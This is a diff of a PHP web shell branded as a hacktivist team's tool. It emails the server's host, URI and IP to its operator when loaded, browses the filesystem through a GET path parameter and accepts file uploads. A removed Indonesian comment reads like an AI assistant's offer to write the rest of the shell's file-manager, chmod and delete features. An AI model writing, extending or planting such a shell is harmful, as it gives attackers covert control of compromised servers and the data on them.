@@ -41,7 +41,9 @@ $uri = $_SERVER['REQUEST_URI'];
 $host = $_SERVER['HTTP_HOST'];
 mail($email, $subjek, "$uri $host $ip", "From: web");
 
-// Konten HTML utama
+$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
+$path = str_replace('\\', '/', $path);
+$paths = explode('/', $path);
 ?>
 <!DOCTYPE html>
 <html>
@@ -94,9 +96,6 @@ input, select, textarea {
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td><font color="white">Path :</font>
 <?php
-$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
-$path = str_replace('\\', '/', $path);
-$paths = explode('/', $path);
 foreach ($paths as $id => $pat) {
     if ($pat == '' && $id == 0) {
         echo '<a href="?path=/">/</a>';
@@ -129,14 +128,6 @@ if (isset($_FILES['file'])) {
 </form>
 </td></tr>
 </table>
-
-<?php
-// Bagian eksekusi dan manipulasi file akan tetap seperti struktur sebelumnya
-// Untuk menjaga script ini tetap aman dan tidak terlalu panjang,
-// sebaiknya struktur lengkap termasuk tampilan file manager, edit, chmod, delete, dll,
-// diletakkan dalam fungsi atau file terpisah. Tapi jika kamu ingin, saya bisa bantu lanjut bagian bawahnya juga.
-
-echo '<center><br/><p>COPYRIGHT © SADBOY CYBER TEAM HACKTIVIST</p></center>';
-?>
+<center><br/><p>COPYRIGHT © SADBOY CYBER TEAM HACKTIVIST</p></center>
 </body>
 </html>
